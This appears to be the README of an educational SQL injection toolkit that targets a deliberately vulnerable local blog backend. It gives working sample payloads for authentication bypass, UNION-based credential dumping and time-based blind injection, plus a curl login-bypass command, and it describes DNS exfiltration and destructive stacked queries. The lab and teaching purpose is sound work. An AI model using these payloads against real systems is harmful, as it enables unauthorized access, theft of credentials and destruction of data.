# SQL Injection Attack Testing Suite

Complete SQL injection testing framework for the Blog Platform vulnerable backend.

## ⚠️ Warning
These tools are for **educational and authorized security testing ONLY**. Unauthorized access to computer systems is illegal.

---

## 📋 Overview

This suite contains 9 phases of SQL injection attacks, from basic detection to advanced data exfiltration techniques.

### Vulnerable Endpoints
- `POST /api/vulnerable/login` - Username/password fields
- `POST /api/vulnerable/register` - Registration fields  
- `GET /api/vulnerable/search` - Search query parameter
- `GET /api/vulnerable/user/:id` - User ID parameter
- `GET /api/vulnerable/demo` - Educational demo page

---

## 🚀 Quick Start

### 1. Start the vulnerable backend
```bash
cd blog-platform
docker-compose up -d
```

### 2. Run the main attack orchestrator
```bash
python attack.py --phase all
```

### 3. Explore database structure
```bash
python explore_database.py
```

---

## 📊 Testing Phases

| Phase | Name | Difficulty | Attack Type | Input Field |
|-------|------|-----------|-------------|------------|
| 1 | Error-Based | ⭐ Easy | Information Gathering | username |
| 2 | Auth Bypass | ⭐ Easy | Authentication Bypass | username |
| 3 | Union-Based | ⭐⭐ Medium | Data Extraction | username |
| 4 | Blind Injection | ⭐⭐⭐ Hard | Time-Based Detection | username |
| 5 | Advanced Extraction | ⭐⭐ Medium | Multi-Column Data Dump | username |
| 6 | Out-of-Band | ⭐⭐⭐ Hard | DNS Exfiltration | username |
| 7 | Second-Order | ⭐⭐ Medium | Stored Payload Attack | registration |
| 8 | Stacked Queries | ⭐⭐⭐ Hard | Multi-Statement Injection | username |
| 9 | WAF Bypass | ⭐⭐⭐ Hard | Encoding/Obfuscation | username |

---

## 🛠️ Tools Available

### Main Scripts
- **`attack.py`** - Orchestrator to run all phases sequentially
- **`explore_database.py`** - Systematic database structure discovery
- **`payloads.json`** - Collection of all test payloads organized by phase

### Phase-Specific Scripts
- **`phases/01_error_based.py`** - Phase 1: Error-Based SQL Injection
- **`phases/02_auth_bypass.py`** - Phase 2: Authentication Bypass
- **`phases/03_union_based.py`** - Phase 3: Union-Based SQL Injection
- **`phases/04_blind_injection.py`** - Phase 4: Blind SQL Injection (Time-Based)
- **`phases/05_advanced_extraction.py`** - Phase 5: Advanced Data Extraction
- **`phases/06_out_of_band.py`** - Phase 6: Out-of-Band SQL Injection
- **`phases/07_second_order.py`** - Phase 7: Second-Order SQL Injection
- **`phases/08_stacked_queries.py`** - Phase 8: Stacked Queries
- **`phases/09_waf_bypass.py`** - Phase 9: WAF Bypass & Encoding

---

## 💻 Usage Examples

### Run all phases
```bash
python attack.py --phase all
```

### Run specific phase
```bash
python attack.py --phase 2        # Auth Bypass only
python attack.py --phase 3 --verbose  # Union-Based with detailed output
```

### Run specific phase script
```bash
python phases/02_auth_bypass.py
python phases/03_union_based.py --target http://localhost:5000
```

### Explore database
```bash
python explore_database.py --full   # Complete database discovery
python explore_database.py --users  # Extract all users
python explore_database.py --tables # List all tables
```

---

## 📁 Output Files

Results are saved in `/captures/` directory:

- `users_extracted.json` - All extracted users and credentials
- `database_info.txt` - Database version, name, current user
- `tables_discovered.json` - All tables and columns in database
- `payloads_successful.json` - Working payloads logged with responses
- `vulnerabilities_found.md` - Summary of all found vulnerabilities
- `session_TIMESTAMP.log` - Complete session log with all requests/responses

---

## 🔍 Phase Details

### Phase 1: Error-Based SQL Injection
Detects vulnerability using database error messages.
```bash
python phases/01_error_based.py
```
**Tests:**
- Database type detection
- Database version extraction
- Current database name discovery
- Current user identification

**Sample Payload:**
```sql
admin' AND 1=1 --
```

---

### Phase 2: Authentication Bypass
Bypasses login without knowing password.
```bash
python phases/02_auth_bypass.py
```
**Tests:**
- Basic comment bypass (`--`)
- Always-true conditions (`' OR '1'='1`)
- Multiple bypass techniques
- Admin account targeting

**Sample Payload:**
```sql
admin' --
```

---

### Phase 3: Union-Based SQL Injection
Extracts data using UNION SELECT statements.
```bash
python phases/03_union_based.py
```
**Tests:**
- Column count detection (ORDER BY method)
- UNION SELECT validation
- Table enumeration
- Complete user database extraction
- Sensitive data retrieval

**Sample Payload:**
```sql
' UNION SELECT id, username, email, password, role FROM Users --
```

---

### Phase 4: Blind SQL Injection
Infers data without visible output using time delays.
```bash
python phases/04_blind_injection.py
```
**Tests:**
- Time-based blind detection
- Boolean-based blind detection
- Character-by-character extraction
- Database structure inference

**Sample Payload:**
```sql
admin' AND IF(1=1, SLEEP(3), 0) --
```

---

### Phase 5: Advanced Data Extraction
Extracts multiple data sources simultaneously.
```bash
python phases/05_advanced_extraction.py
```
**Tests:**
- GROUP_CONCAT for mass extraction
- CONCAT for column concatenation
- Multi-table joins
- Information schema access

**Sample Payload:**
```sql
' UNION SELECT GROUP_CONCAT(username, ':', password) FROM Users --
```

---

### Phase 6: Out-of-Band SQL Injection
Exfiltrates data via DNS/HTTP callbacks.
```bash
python phases/06_out_of_band.py
```
**Tests:**
- DNS-based exfiltration
- HTTP-based exfiltration
- Data tunnel setup
- External communication detection

---

### Phase 7: Second-Order SQL Injection
Stores payload for later execution.
```bash
python phases/07_second_order.py
```
**Tests:**
- Payload registration
- Stored query execution
- Session-based attacks
- Delayed payload activation

---

### Phase 8: Stacked Queries
Executes multiple SQL statements.
```bash
python phases/08_stacked_queries.py
```
**Tests:**
- User creation
- Data modification
- Table deletion (DESTRUCTIVE)
- Database manipulation

**⚠️ WARNING:** This phase can modify/destroy data!

---

### Phase 9: WAF Bypass & Encoding
Bypasses security filters and WAF rules.
```bash
python phases/09_waf_bypass.py
```
**Tests:**
- URL encoding variations
- Double encoding
- Case variation
- Comment obfuscation
- Alternative SQL syntax

---

## 📊 Payload Format

Payloads are organized in `payloads.json`:

```json
{
  "phase_1": {
    "error_based": [
      {
        "name": "Database Type Detection",
        "payload": "admin' AND 1=1 --",
        "field": "username",
        "expected": "Working condition",
        "description": "Tests if database accepts condition"
      }
    ]
  },
  "phase_2": {
    "auth_bypass": [
      {
        "name": "Comment Bypass",
        "payload": "admin' --",
        "field": "username",
        "expected": "Login successful",
        "description": "Bypasses password check using SQL comments"
      }
    ]
  }
}
```

---

## 🔐 Target Database Schema

### Users Table
```
id (INT) - User ID
username (VARCHAR) - Login username
email (VARCHAR) - Email address
password (VARCHAR) - Password hash
role (ENUM) - 'user' or 'admin'
lastLogin (DATETIME) - Last login timestamp
isActive (BOOLEAN) - Active status
createdAt (DATETIME) - Account creation time
updatedAt (DATETIME) - Last update time
```

### Articles Table
```
id (INT) - Article ID
title (VARCHAR) - Article title
content (TEXT) - Article content
authorId (INT) - Author user ID
category (VARCHAR) - Category name
views (INT) - View count
published (BOOLEAN) - Published status
createdAt (DATETIME) - Creation time
updatedAt (DATETIME) - Update time
```

---

## 📈 Testing Workflow

**Recommended Sequence:**

1. **Phase 1** → Confirm vulnerability exists
2. **Phase 2** → Gain admin access
3. **Phase 3** → Extract user database
4. **Phase 5** → Bulk data extraction
5. **Phase 4** → Test blind injection (if needed)
6. **Phase 9** → Test bypass techniques
7. **Phase 7** → Test stored attacks
8. **Phase 8** → ⚠️ Destructive tests (last, use carefully)

---

## 🎯 Success Indicators

| Phase | Success Means |
|-------|--------------|
| 1 | See database error messages |
| 2 | Login without password |
| 3 | Extract user credentials |
| 4 | Infer data via timing |
| 5 | Dump complete database |
| 6 | Receive out-of-band callback |
| 7 | Trigger stored payload |
| 8 | Modify/delete data |
| 9 | Bypass input filters |

---

## 🧪 Verification Steps

### Verify Backend is Vulnerable
```bash
# Test the demo endpoint
curl http://localhost:5000/api/vulnerable/demo

# Test basic login
curl -X POST http://localhost:5000/api/vulnerable/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' --","password":"test"}'
```

### Check Logs
```bash
# Watch backend logs
docker-compose logs -f backend
```

### Verify Data Extraction
```bash
# Extract users via union injection
python phases/03_union_based.py --verbose
```

---

## 📝 Results Documentation

All results are automatically saved:
- **Session logs** → `captures/session_*.log`
- **Extracted data** → `captures/users_extracted.json`
- **Payloads used** → `captures/payloads_successful.json`
- **Summary** → `captures/vulnerabilities_found.md`

---

## 🛡️ Defense Review

Use these tests to identify and fix SQL injection vulnerabilities:

1. **Use parameterized queries** (prepared statements)
2. **Input validation** on all user inputs
3. **Output encoding** for display
4. **Error handling** - don't expose database errors
5. **Least privilege** database accounts
6. **WAF rules** for malicious patterns
7. **Rate limiting** on login attempts

---

## ⚠️ Legal Notice

This toolkit is provided for:
- ✅ Authorized security testing
- ✅ Educational purposes
- ✅ Learning about SQL injection
- ✅ Securing your own applications

**Unauthorized access to computer systems is ILLEGAL.**

---

## 📞 Support

For questions or issues:
1. Check individual phase scripts for detailed comments
2. Review `payloads.json` for payload syntax
3. Check backend logs: `docker-compose logs backend`
4. Ensure database connection is active

---

## 📚 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

**Created for:** Cybersecurity Learning Lab  
**Target:** Blog Platform (Vulnerable Backend)  
**Last Updated:** 2026-05-12
